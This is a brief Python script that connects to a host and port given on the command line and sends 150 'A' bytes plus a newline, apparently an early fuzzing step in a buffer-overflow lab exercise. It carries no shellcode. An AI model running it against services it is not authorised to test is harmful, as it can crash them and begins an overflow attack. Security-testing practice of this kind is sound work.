#!/usr/bin/env python3
import socket,sys

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload 
payload = "\x41"
payload_size = 150
postfix = "\n"

buff = ""
buff += payload  * payload_size
buff += postfix 

# payload status
s.sendall(buff.encode('utf-8'))
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff) - len(postfix)))

# handle response
response = s.recv(1024)
print("Received: {}".format(response))
